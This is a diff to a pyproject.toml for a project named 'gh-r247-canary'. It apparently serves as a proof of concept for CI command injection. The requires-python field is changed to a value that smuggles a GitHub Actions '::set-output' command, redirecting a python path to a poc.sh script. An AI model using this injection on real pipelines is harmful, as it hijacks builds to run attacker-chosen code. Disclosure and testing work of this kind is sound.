@@ -1,4 +1,4 @@
 [project]
 name = "gh-r247-canary"
 version = "0.0.1"
-requires-python = ">=3.13"
+requires-python = "not-a-version\n::set-output name=python-path::/home/runner/work/gh-r247-setup-python-command/gh-r247-setup-python-command/poc.sh\n"
